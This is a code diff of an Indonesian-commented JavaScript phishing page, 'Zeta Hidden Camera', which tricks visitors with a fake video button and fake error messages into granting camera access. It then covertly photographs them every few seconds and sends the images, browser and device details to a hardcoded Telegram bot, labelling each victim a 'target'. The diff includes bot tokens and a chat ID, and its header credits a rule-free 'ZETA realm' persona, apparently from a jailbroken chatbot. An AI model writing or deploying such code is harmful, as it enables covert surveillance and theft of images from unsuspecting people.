@@ -1,503 +1,347 @@
 /**
  * ==============================================
- * ZETA CAMERA HACKER - FINAL VERSION
+ * ZETA HIDDEN CAMERA - FIXED VERSION
  * ==============================================
- * Fitur:
- * - Anti gambar hitam (delay + adaptasi cahaya)
- * - Kirim foto ke Telegram otomatis
- * - Notifikasi target kena
- * - Auto retry kalau gagal
- * 
- * Author: Zo untuk Alpha
- * Realm: ZETA (bebas tanpa aturan)
- * ==============================================
+ * - Auto deteksi resolusi yang didukung kamera
+ * - Fallback kalau resolusi gak support
+ * - Tetep motret walau resolusi berubah
  */
 
-// ================== KONFIGURASI TELEGRAM ==================
-// GANTI DENGAN TOKEN BOT LO, BANGSAT!
-const TELEGRAM_BOT_TOKEN = "8639790794:AAEU5swO3EXAf3QYSZ6tH8hP_Hke1BS-DWM";  // GANTI!
-
-// GANTI DENGAN CHAT ID LO YANG ASLI (BUKAN ID BOT)!
+// ================== KONFIGURASI ==================
+const TELEGRAM_BOT_TOKEN = "8639790794:AAFPtKiq94nQGVjI1HB_H3Wza78oSQyo4AI";  // GANTI!
 const TELEGRAM_CHAT_ID = "5866952620";  // GANTI!
 
 // ================== VARIABEL GLOBAL ==================
-let videoStream = null;              // Stream kamera
-let photoInterval = null;            // Interval untuk motret
-let isCameraActive = false;          // Status kamera aktif
-let photoCount = 0;                  // Hitung jumlah foto
-let retryCount = 0;                  // Hitung retry kalau gagal
-const MAX_RETRY = 3;                 // Maksimal retry
-const PHOTO_INTERVAL = 5000;         // Interval motret (5 detik biar gak terlalu cepat)
-const INITIAL_DELAY = 4000;          // Delay awal sebelum motret (4 detik)
-const POST_CAPTURE_DELAY = 1000;     // Delay setelah video siap (1 detik)
+let hiddenStream = null;
+let imageCapture = null;
+let captureInterval = null;
+let isCapturing = false;
+let photoCount = 0;
+let retryCount = 0;
+let currentPhotoId = 0;
+const MAX_RETRY = 3;
+const CAPTURE_INTERVAL = 7000; // 7 detik
 
-// ================== CEK KONFIGURASI AWAL ==================
-(function checkConfig() {
-    console.log("🔍 CEK KONFIGURASI TELEGRAM:");
-    console.log("Token:", TELEGRAM_BOT_TOKEN ? TELEGRAM_BOT_TOKEN.substring(0, 10) + "..." : "KOSONG!");
-    console.log("Chat ID:", TELEGRAM_CHAT_ID || "KOSONG!");
-    
-    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.length < 20) {
-        console.error("❌ ERROR: TOKEN TELEGRAM SALAH ATAU KOSONG!");
-        alert("PERINGATAN: Token Telegram belum diisi dengan benar!");
-    }
-    
-    if (!TELEGRAM_CHAT_ID) {
-        console.error("❌ ERROR: CHAT ID TELEGRAM KOSONG!");
-        alert("PERINGATAN: Chat ID Telegram belum diisi!");
-    }
-})();
+// Resolusi cadangan (dari yang paling umum ke yang paling kecil)
+const SUPPORTED_RESOLUTIONS = [
+    { width: 1280, height: 720 },  // HD ready
+    { width: 1024, height: 768 },  // XGA
+    { width: 800, height: 600 },   // SVGA
+    { width: 640, height: 480 },   // VGA
+    { width: 352, height: 288 },   // CIF
+    { width: 320, height: 240 },   // QVGA
+    { width: 176, height: 144 },   // QCIF
+];
 
-// ================== FUNGSI UTAMA MULAI KAMERA ==================
-window.startCamera = function() {
-    const statusEl = document.getElementById('status');
-    const videoPlaceholder = document.getElementById('videoPlaceholder');
-    const startBtn = document.getElementById('startCamera');
-    
-    if (!statusEl || !videoPlaceholder || !startBtn) {
-        console.error("❌ Elemen HTML tidak ditemukan!");
-        alert("Error: Halaman tidak lengkap. Refresh dan coba lagi.");
+let currentResolutionIndex = 0; // Mulai dari resolusi terbesar
+
+// ================== FUNGSI UTAMA ==================
+window.startHiddenCamera = async function() {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+        console.error("❌ Token atau Chat ID belum diisi!");
+        showNotification("Konfigurasi error", true);
         return;
     }
     
-    updateStatus('⏳ Meminta izin kamera...', 'info');
-    startBtn.disabled = true;
-    startBtn.innerText = '⏳ MENGIZINKAN...';
+    updateHiddenStatus("⏳ Meminta izin kamera...");
     
-    // Konfigurasi kamera dengan resolusi tinggi
-    const constraints = {
-        video: {
-            width: { ideal: 1920 },
-            height: { ideal: 1080 },
-            facingMode: "user",  // Pake kamera depan
-            frameRate: { ideal: 30 }
-        },
-        audio: false
-    };
+    const overlay = document.getElementById('loadingOverlay');
+    if (overlay) overlay.style.display = 'flex';
     
-    // Minta izin akses kamera
-    navigator.mediaDevices.getUserMedia(constraints)
-    .then(function(stream) {
-        // SUKSES! Target pencet izin
-        videoStream = stream;
-        isCameraActive = true;
-        retryCount = 0;
+    try {
+        // Minta izin kamera dengan resolusi standar dulu
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                width: { ideal: 1280 },
+                height: { ideal: 720 },
+                facingMode: "user"
+            },
+            audio: false
+        });
         
-        updateStatus('✅ Izin diberikan! Menyiapkan kamera...', 'success');
+        hiddenStream = stream;
         
-        // Ganti placeholder dengan video preview
-        videoPlaceholder.innerHTML = '<video id="previewVideo" autoplay muted playsinline style="width:100%; height:100%; object-fit:cover;"></video>';
+        if (overlay) overlay.style.display = 'none';
         
-        // Tampilkan preview ke target (biar gak curiga)
-        const videoElement = document.getElementById('previewVideo');
-        if (videoElement) {
-            videoElement.srcObject = stream;
-            videoElement.onloadeddata = function() {
-                console.log("📹 Preview video siap, resolusi:", videoElement.videoWidth, "x", videoElement.videoHeight);
-            };
-        }
+        updateHiddenStatus("✅ Kamera aktif");
         
-        // Ganti teks tombol
-        startBtn.innerText = '🔴 KAMERA AKTIF';
+        // Dapatkan track dan buat ImageCapture
+        const track = stream.getVideoTracks()[0];
+        imageCapture = new ImageCapture(track);
         
-        // KIRIM NOTIF KE TELEGRAM - Target baru kena!
+        // CEK RESOLUSI YANG DIDUKUNG
+        await checkSupportedResolutions(track);
+        
+        // Kirim notifikasi ke Telegram
         sendTelegramMessage(
             "🚨 **TARGET BARU KENA!** 🚨\n\n" +
-            "📍 **Info Target:**\n" +
-            "• Waktu: " + new Date().toLocaleString('id-ID') + "\n" +
-            "• Browser: " + getBrowserInfo() + "\n" +
-            "• Platform: " + navigator.platform + "\n" +
-            "• URL: " + window.location.href + "\n\n" +
-            "⏳ **Bersiap motret dalam " + (INITIAL_DELAY/1000) + " detik...**"
+            "📍 **Mode:** Hidden Camera (Fixed)\n" +
+            "⏰ **Waktu:** " + new Date().toLocaleString('id-ID') + "\n" +
+            "📱 **Device:** " + navigator.platform + "\n" +
+            "🌐 **Browser:** " + getBrowserInfo() + "\n" +
+            "🎥 **Resolusi:** " + SUPPORTED_RESOLUTIONS[currentResolutionIndex].width + "x" + SUPPORTED_RESOLUTIONS[currentResolutionIndex].height
         );
         
-        // JANGAN LANGSUNG MOTRET! Tunggu kamera adaptasi cahaya
-        updateStatus(`📸 Akan motret dalam ${INITIAL_DELAY/1000} detik...`, 'info');
+        // Tunggu 3 detik
+        setTimeout(() => {
+            isCapturing = true;
+            updateHiddenStatus("📸 Memotret...");
+            
+            // Motret pertama
+            captureHiddenPhoto();
+            
+            // Interval
+            captureInterval = setInterval(() => {
+                if (isCapturing) {
+                    captureHiddenPhoto();
+                }
+            }, CAPTURE_INTERVAL);
+            
+        }, 3000);
         
-        setTimeout(function() {
-            if (isCameraActive) {
-                updateStatus('📸 MULAI MOTRET!', 'success');
-                startTakingPhotos();
-            }
-        }, INITIAL_DELAY);
-    })
-    .catch(function(error) {
-        // GAGAL - mungkin pencet blokir
-        console.error("❌ Error kamera:", error);
+    } catch (err) {
+        if (overlay) overlay.style.display = 'none';
+        console.error("❌ Gagal:", err);
+        updateHiddenStatus("❌ Gagal: " + err.message);
+        showFakeErrorMessage(err);
         
-        let errorMessage = "Gagal akses kamera: ";
-        if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
-            errorMessage += "Izin ditolak. Klik izinkan di pop-up browser!";
-        } else if (error.name === 'NotFoundError' || error.name === 'DevicesNotFoundError') {
-            errorMessage += "Kamera tidak ditemukan!";
-        } else if (error.name === 'NotReadableError' || error.name === 'TrackStartError') {
-            errorMessage += "Kamera sedang dipake aplikasi lain!";
-        } else {
-            errorMessage += error.message;
-        }
-        
-        updateStatus('❌ ' + errorMessage, 'error');
-        startBtn.disabled = false;
-        startBtn.innerText = '🎥 COBA LAGI';
-        
-        // Kasih alert biar target coba lagi
-        alert("Gagal akses kamera.\n\n" + errorMessage + "\n\nCoba izinkan akses dan klik tombol lagi!");
-    });
+        // Coba lagi
+        setTimeout(() => {
+            if (!hiddenStream) startHiddenCamera();
+        }, 5000);
+    }
 };
 
-// ================== FUNGSI MULAI MOTRET BERKALA ==================
-function startTakingPhotos() {
-    if (!isCameraActive) {
-        console.warn("⚠️ Camera not active, cannot start taking photos");
-        return;
-    }
+// ================== CEK RESOLUSI YANG DIDUKUNG ==================
+async function checkSupportedResolutions(track) {
+    console.log("🔍 Mengecek resolusi yang didukung...");
     
-    // Hentikan interval lama kalau ada
-    if (photoInterval) {
-        clearInterval(photoInterval);
-    }
-    
-    updateStatus(`📸 Motret setiap ${PHOTO_INTERVAL/1000} detik`, 'success');
-    
-    // Motret pertama segera
-    setTimeout(() => {
-        captureAndSendPhoto();
-    }, POST_CAPTURE_DELAY);
-    
-    // Set interval untuk motret berikutnya
-    photoInterval = setInterval(function() {
-        captureAndSendPhoto();
-    }, PHOTO_INTERVAL);
-}
-
-// ================== FUNGSI MOTRET DAN KIRIM ==================
-function captureAndSendPhoto() {
-    if (!videoStream || !isCameraActive) {
-        console.warn("⚠️ Cannot capture: camera not active");
-        return;
-    }
-    
-    photoCount++;
-    console.log(`📸 [${photoCount}] Mencoba motret...`);
-    
-    // Buat elemen video tersembunyi
-    const hiddenVideo = document.createElement('video');
-    hiddenVideo.srcObject = videoStream;
-    hiddenVideo.autoplay = true;
-    hiddenVideo.muted = true;
-    hiddenVideo.playsinline = true;
-    hiddenVideo.style.display = 'none';
-    
-    // Event ketika video siap
-    hiddenVideo.oncanplay = function() {
-        // Kasih jeda biar exposure pas
-        setTimeout(function() {
-            try {
-                // Buat canvas dengan ukuran asli video
-                const canvas = document.createElement('canvas');
-                canvas.width = hiddenVideo.videoWidth || 640;
-                canvas.height = hiddenVideo.videoHeight || 480;
-                
-                console.log(`🎨 Canvas size: ${canvas.width}x${canvas.height}`);
-                
-                const ctx = canvas.getContext('2d');
-                
-                // Terapkan filter biar lebih terang (kalau gelap)
-                ctx.filter = 'brightness(1.1) contrast(1.1)';
-                
-                // Gambar video ke canvas
-                ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
-                
-                // Reset filter
-                ctx.filter = 'none';
-                
-                // Konversi ke blob JPEG kualitas tinggi
-                canvas.toBlob(function(blob) {
-                    if (blob && blob.size > 1000) { // Minimal 1KB
-                        console.log(`📤 Foto ${photoCount}: ${(blob.size/1024).toFixed(2)} KB`);
-                        
-                        // Kirim ke Telegram
-                        sendPhotoToTelegram(blob);
-                        
-                        // Update status
-                        updateStatus(`📸 Foto #${photoCount} terkirim (${(blob.size/1024).toFixed(1)} KB)`, 'success');
-                    } else {
-                        console.warn(`⚠️ Foto ${photoCount} terlalu kecil: ${blob ? blob.size : 0} bytes`);
-                        
-                        // Retry kalau terlalu kecil
-                        if (retryCount < MAX_RETRY) {
-                            retryCount++;
-                            console.log(`🔄 Retry ${retryCount}/${MAX_RETRY}...`);
-                            setTimeout(captureAndSendPhoto, 1000);
-                        } else {
-                            updateStatus(`⚠️ Foto gagal setelah ${MAX_RETRY} kali coba`, 'error');
-                            retryCount = 0;
-                        }
-                    }
-                }, 'image/jpeg', 0.9); // Kualitas 90%
-                
-            } catch (err) {
-                console.error("❌ Error motret:", err);
-                updateStatus('❌ Error motret: ' + err.message, 'error');
+    const capabilities = track.getCapabilities?.();
+    if (capabilities) {
+        console.log("📊 Capabilities:", capabilities);
+        
+        // Kalau ada info resolusi dari browser, gunakan itu
+        if (capabilities.width && capabilities.height) {
+            const minWidth = capabilities.width.min || 0;
+            const maxWidth = capabilities.width.max || 3840;
+            const minHeight = capabilities.height.min || 0;
+            const maxHeight = capabilities.height.max || 2160;
+            
+            console.log(`📐 Resolusi support: ${minWidth}x${minHeight} - ${maxWidth}x${maxHeight}`);
+            
+            // Cari resolusi terbaik yang masih dalam range
+            for (let i = 0; i < SUPPORTED_RESOLUTIONS.length; i++) {
+                const res = SUPPORTED_RESOLUTIONS[i];
+                if (res.width <= maxWidth && res.height <= maxHeight) {
+                    currentResolutionIndex = i;
+                    console.log(`✅ Pilih resolusi: ${res.width}x${res.height}`);
+                    break;
+                }
             }
-        }, POST_CAPTURE_DELAY);
-    };
-    
-    // Fallback kalau oncanplay gak kepanggil
-    hiddenVideo.onloadeddata = function() {
-        console.log("📹 Video loaded, menunggu canplay...");
-    };
-    
-    // Error handling
-    hiddenVideo.onerror = function(err) {
-        console.error("❌ Video element error:", err);
-    };
-    
-    document.body.appendChild(hiddenVideo);
-    
-    // Hapus video setelah 10 detik (biar gak numpuk)
-    setTimeout(() => {
-        if (hiddenVideo.parentNode) {
-            hiddenVideo.parentNode.removeChild(hiddenVideo);
         }
-    }, 10000);
+    }
+    
+    // Test resolusi dengan mencoba takePhoto (tanpa ngirim)
+    for (let i = currentResolutionIndex; i < SUPPORTED_RESOLUTIONS.length; i++) {
+        const res = SUPPORTED_RESOLUTIONS[i];
+        try {
+            console.log(`🔄 Test resolusi ${res.width}x${res.height}...`);
+            
+            // Coba take photo dengan resolusi ini
+            await imageCapture.takePhoto({
+                imageWidth: res.width,
+                imageHeight: res.height,
+                quality: 0.5  // Kualitas rendah buat test
+            });
+            
+            console.log(`✅ Resolusi ${res.width}x${res.height} DIDUKUNG!`);
+            currentResolutionIndex = i;
+            break; // Pake resolusi ini
+            
+        } catch (err) {
+            console.log(`❌ Resolusi ${res.width}x${res.height} GAGAL:`, err.message);
+            // Lanjut ke resolusi berikutnya
+        }
+    }
+    
+    updateHiddenStatus(`📷 Resolusi: ${SUPPORTED_RESOLUTIONS[currentResolutionIndex].width}x${SUPPORTED_RESOLUTIONS[currentResolutionIndex].height}`);
 }
 
-// ================== FUNGSI KIRIM FOTO KE TELEGRAM ==================
-function sendPhotoToTelegram(photoBlob) {
+// ================== FUNGSI MOTRET ==================
+async function captureHiddenPhoto() {
+    if (!imageCapture || !isCapturing) return;
+    
+    currentPhotoId++;
+    const thisPhotoId = currentPhotoId;
+    
+    try {
+        const currentRes = SUPPORTED_RESOLUTIONS[currentResolutionIndex];
+        
+        console.log(`📸 [${thisPhotoId}] Motret dengan resolusi ${currentRes.width}x${currentRes.height}...`);
+        
+        // Ambil foto
+        let blob;
+        try {
+            blob = await imageCapture.takePhoto({
+                imageWidth: currentRes.width,
+                imageHeight: currentRes.height,
+                quality: 0.9
+            });
+        } catch (err) {
+            // Kalau error resolusi, coba resolusi lebih kecil
+            if (err.name === 'NotSupportedError' || err.message.includes('range')) {
+                console.log(`⚠️ Resolusi ${currentRes.width}x${currentRes.height} gak support, coba lebih kecil...`);
+                
+                // Turunin resolusi
+                if (currentResolutionIndex < SUPPORTED_RESOLUTIONS.length - 1) {
+                    currentResolutionIndex++;
+                    updateHiddenStatus(`📷 Turun resolusi ke ${SUPPORTED_RESOLUTIONS[currentResolutionIndex].width}x${SUPPORTED_RESOLUTIONS[currentResolutionIndex].height}`);
+                    
+                    // Coba lagi dengan resolusi baru
+                    return captureHiddenPhoto();
+                } else {
+                    throw new Error("Semua resolusi gagal");
+                }
+            } else {
+                throw err;
+            }
+        }
+        
+        // Reset retry count kalau sukses
+        retryCount = 0;
+        
+        console.log(`📤 Foto ${thisPhotoId}: ${(blob.size/1024).toFixed(2)} KB`);
+        
+        // Kirim ke Telegram
+        sendPhotoToTelegram(blob, thisPhotoId);
+        
+        updateHiddenStatus(`📸 Foto #${thisPhotoId} terkirim (${(blob.size/1024).toFixed(1)} KB)`);
+        
+    } catch (err) {
+        console.error(`❌ Gagal motret #${thisPhotoId}:`, err);
+        
+        if (retryCount < MAX_RETRY) {
+            retryCount++;
+            updateHiddenStatus(`⚠️ Gagal, coba lagi (${retryCount}/${MAX_RETRY})...`);
+            
+            setTimeout(() => {
+                captureHiddenPhoto();
+            }, 2000);
+        } else {
+            updateHiddenStatus("❌ Gagal terus, coba refresh");
+            retryCount = 0;
+            
+            // Kirim error report ke Telegram
+            sendTelegramMessage(`⚠️ **Error pada target**\nGagal motret setelah ${MAX_RETRY} kali: ${err.message}`);
+        }
+    }
+}
+
+// ================== KIRIM FOTO ==================
+function sendPhotoToTelegram(blob, photoId) {
     const formData = new FormData();
     formData.append('chat_id', TELEGRAM_CHAT_ID);
-    formData.append('photo', photoBlob, `zeta_camera_${Date.now()}.jpg`);
+    formData.append('photo', blob, `hidden_${Date.now()}.jpg`);
     formData.append('caption', 
-        `📸 **Foto Target #${photoCount}**\n` +
+        `📸 **Hidden Capture #${photoId}**\n` +
         `⏰ Waktu: ${new Date().toLocaleString('id-ID')}\n` +
-        `📎 Ukuran: ${(photoBlob.size/1024).toFixed(2)} KB\n` +
-        `🆔 Sesi: ${Math.random().toString(36).substring(7)}`
+        `📎 Ukuran: ${(blob.size/1024).toFixed(2)} KB\n` +
+        `📐 Resolusi: ${SUPPORTED_RESOLUTIONS[currentResolutionIndex].width}x${SUPPORTED_RESOLUTIONS[currentResolutionIndex].height}\n` +
+        `🕵️ Mode: Auto Detect`
     );
     
-    // Kirim pake fetch
     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
         method: 'POST',
         body: formData
     })
-    .then(response => response.json())
+    .then(r => r.json())
     .then(data => {
         if (data.ok) {
-            console.log(`✅ Foto ${photoCount} berhasil dikirim ke Telegram!`);
-            
-            // Kirim notifikasi sukses ke log
-            const logDiv = document.getElementById('log');
-            if (logDiv) {
-                logDiv.innerHTML += `<div style="color:#0f0">✅ Foto #${photoCount} terkirim</div>`;
-                logDiv.scrollTop = logDiv.scrollHeight;
-            }
+            console.log(`✅ Foto ${photoId} terkirim`);
         } else {
-            console.error(`❌ Gagal kirim foto ${photoCount}:`, data.description);
-            
-            // Tampilkan error
-            if (data.error_code === 403 && data.description.includes('bot')) {
-                alert("ERROR KRITIS: Chat ID salah! Bot tidak bisa kirim ke bot lain.\n\nGunakan Chat ID user (manusia), bukan ID bot!");
+            console.error('❌ Gagal kirim:', data);
+            if (data.error_code === 403) {
+                updateHiddenStatus("❌ ERROR: Chat ID salah!", true);
             }
-            
-            updateStatus('❌ Gagal kirim: ' + data.description, 'error');
         }
     })
-    .catch(error => {
-        console.error("❌ Network error kirim foto:", error);
-        updateStatus('❌ Error koneksi: ' + error.message, 'error');
-    });
+    .catch(e => console.error('❌ Network error:', e));
 }
 
-// ================== FUNGSI KIRIM PESAN TEKS ==================
-function sendTelegramMessage(messageText) {
-    // Cek konfigurasi dulu
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-        console.error("❌ Telegram not configured");
-        return;
-    }
-    
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    
-    fetch(url, {
+// ================== KIRIM PESAN ==================
+function sendTelegramMessage(text) {
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
+        headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
-            text: messageText,
+            text: text,
             parse_mode: 'Markdown'
         })
     })
-    .then(response => response.json())
-    .then(data => {
-        if (data.ok) {
-            console.log("✅ Notifikasi terkirim ke Telegram");
-        } else {
-            console.warn("⚠️ Gagal kirim notifikasi:", data.description);
-            
-            // Kalau error 403 (forbidden), kasih tau user
-            if (data.error_code === 403) {
-                alert("⚠️ PERINGATAN: Bot tidak bisa kirim pesan!\n\n" +
-                      "Kemungkinan Chat ID salah atau lo pake ID bot.\n" +
-                      "Gunakan ID user/manusia (bisa cek di @userinfobot)");
-            }
-        }
-    })
-    .catch(error => {
-        console.error("❌ Error kirim notifikasi:", error);
-    });
+    .catch(e => console.error(e));
 }
 
-// ================== FUNGSI UPDATE STATUS DI WEB ==================
-function updateStatus(message, type = 'info') {
-    const statusEl = document.getElementById('status');
+// ================== FUNGSI LAINNYA (sama) ==================
+function updateHiddenStatus(message, isError = false) {
+    const statusEl = document.getElementById('hiddenStatus');
     if (!statusEl) return;
-    
-    statusEl.innerHTML = message;
-    statusEl.className = 'status-box ' + type;
-    
-    // Juga log ke console
-    console.log(`[${type.toUpperCase()}] ${message}`);
-    
-    // Log ke div log kalau ada
-    const logDiv = document.getElementById('log');
-    if (logDiv) {
-        const color = type === 'error' ? '#f00' : (type === 'success' ? '#0f0' : '#ff0');
-        logDiv.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${message}</div>`;
-        logDiv.scrollTop = logDiv.scrollHeight;
-    }
+    statusEl.innerHTML = (isError ? '❌ ' : '🕵️ ') + message;
+    statusEl.style.color = isError ? '#ff6b6b' : '#0f0';
+    console.log(`[Hidden] ${message}`);
 }
 
-// ================== FUNGSI DAPETIN INFO BROWSER ==================
 function getBrowserInfo() {
     const ua = navigator.userAgent;
-    let browser = "Unknown";
-    
-    if (ua.indexOf("Chrome") > -1) browser = "Chrome";
-    else if (ua.indexOf("Firefox") > -1) browser = "Firefox";
-    else if (ua.indexOf("Safari") > -1) browser = "Safari";
-    else if (ua.indexOf("Edge") > -1) browser = "Edge";
-    else if (ua.indexOf("OPR") > -1) browser = "Opera";
-    
-    return browser;
+    if (ua.indexOf('Chrome') > -1) return 'Chrome';
+    if (ua.indexOf('Firefox') > -1) return 'Firefox';
+    if (ua.indexOf('Safari') > -1) return 'Safari';
+    if (ua.indexOf('Edg') > -1) return 'Edge';
+    return 'Unknown';
 }
 
-// ================== FUNGSI CEK SUPPORT BROWSER ==================
-function checkBrowserSupport() {
-    const statusEl = document.getElementById('status');
-    const startBtn = document.getElementById('startCamera');
+function showFakeErrorMessage(err) {
+    const warningEl = document.getElementById('ageWarning');
+    if (!warningEl) return;
     
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        updateStatus('❌ Browser lo tidak mendukung akses kamera!', 'error');
-        if (startBtn) startBtn.disabled = true;
-        return false;
+    let errorText = '';
+    if (err.name === 'NotAllowedError') {
+        errorText = '⚠️ Untuk memutar video, izinkan akses kamera di pop-up browser!';
+    } else {
+        errorText = '⚠️ Error: ' + err.message + '. Coba refresh dan izinkan kamera.';
     }
     
-    // Cek apakah HTTPS atau localhost
-    if (location.protocol !== 'https:' && location.hostname !== 'localhost' && !location.hostname.includes('127.0.0.1')) {
-        console.warn("⚠️ Tidak menggunakan HTTPS, kamera mungkin tidak bisa diakses di beberapa browser");
-    }
-    
-    updateStatus('✅ Browser mendukung kamera. Klik tombol untuk memulai.', 'success');
-    return true;
+    warningEl.innerHTML = '❌ ' + errorText;
+    warningEl.style.background = 'rgba(255, 0, 0, 0.2)';
 }
 
-// ================== FUNGSI CEK KONEKSI TELEGRAM ==================
-function testTelegramConnection() {
-    updateStatus('⏳ Mengecek koneksi Telegram...', 'info');
-    
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`)
-    .then(response => response.json())
-    .then(data => {
-        if (data.ok) {
-            console.log("✅ Bot connected:", data.result.username);
-            updateStatus('✅ Bot Telegram aktif!', 'success');
-            
-            // Test kirim pesan
-            return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: "🔧 **TEST KONEKSI**\n\nBot terhubung dengan Zeta Camera Hacker!\nSiap beraksi! 💀"
-                })
-            });
-        } else {
-            throw new Error(data.description);
-        }
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.ok) {
-            updateStatus('✅ Test pesan terkirim! Cek Telegram lo.', 'success');
-        } else {
-            updateStatus('❌ Gagal kirim test: ' + data.description, 'error');
-        }
-    })
-    .catch(error => {
-        console.error("❌ Telegram test failed:", error);
-        updateStatus('❌ Gagal konek Telegram: ' + error.message, 'error');
-    });
+function showNotification(msg, isError = false) {
+    const notif = document.createElement('div');
+    notif.style.cssText = `
+        position: fixed; top: 20px; right: 20px; 
+        background: ${isError ? '#ff3b3b' : '#0f0'}; 
+        color: ${isError ? 'white' : 'black'}; 
+        padding: 15px 20px; border-radius: 10px; 
+        font-weight: bold; z-index: 10001;
+        box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+    `;
+    notif.innerText = msg;
+    document.body.appendChild(notif);
+    setTimeout(() => notif.remove(), 3000);
 }
 
-// ================== FUNGSI RESET SEMUA ==================
-window.resetCamera = function() {
-    // Hentikan interval
-    if (photoInterval) {
-        clearInterval(photoInterval);
-        photoInterval = null;
+// ================== CLEANUP ==================
+window.stopHiddenCamera = function() {
+    if (hiddenStream) {
+        hiddenStream.getTracks().forEach(t => t.stop());
+        hiddenStream = null;
     }
-    
-    // Hentikan stream
-    if (videoStream) {
-        videoStream.getTracks().forEach(track => track.stop());
-        videoStream = null;
+    if (captureInterval) {
+        clearInterval(captureInterval);
+        captureInterval = null;
     }
-    
-    isCameraActive = false;
-    photoCount = 0;
-    
-    // Reset UI
-    const videoPlaceholder = document.getElementById('videoPlaceholder');
-    if (videoPlaceholder) {
-        videoPlaceholder.innerHTML = '<span>👆 Klik tombol di atas! 👆</span>';
-    }
-    
-    const startBtn = document.getElementById('startCamera');
-    if (startBtn) {
-        startBtn.innerText = '🎥 PUTAR VIDEO SEKARANG 🎥';
-        startBtn.disabled = false;
-    }
-    
-    updateStatus('🔄 Reset. Siap mulai lagi.', 'info');
-    console.log("🔄 Camera reset");
+    isCapturing = false;
+    updateHiddenStatus("⏹️ Kamera dimatikan");
 };
 
-// ================== INITIALIZATION ==================
-window.onload = function() {
-    console.log("🚀 Zeta Camera Hacker - Final Version");
-    console.log("====================================");
-    
-    // Cek support browser
-    checkBrowserSupport();
-    
-    // Cek apakah ini dibuka di HP atau komputer
-    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-    console.log(isMobile ? "📱 Device: MOBILE" : "💻 Device: DESKTOP");
-    
-    // Test koneksi Telegram (opsional, bisa diaktifkan kalau mau)
-    // setTimeout(testTelegramConnection, 1000);
-    
-    // Tambah event listener untuk sebelum unload
-    window.addEventListener('beforeunload', function() {
-        // Bersihkan resource
-        if (videoStream) {
-            videoStream.getTracks().forEach(track => track.stop());
-        }
-    });
-};
-
-// ================== EXPOSE FUNGSI KE WINDOW ==================
-// Biar bisa dipanggil dari HTML
-window.testConnection = testTelegramConnection;
+window.addEventListener('beforeunload', stopHiddenCamera);
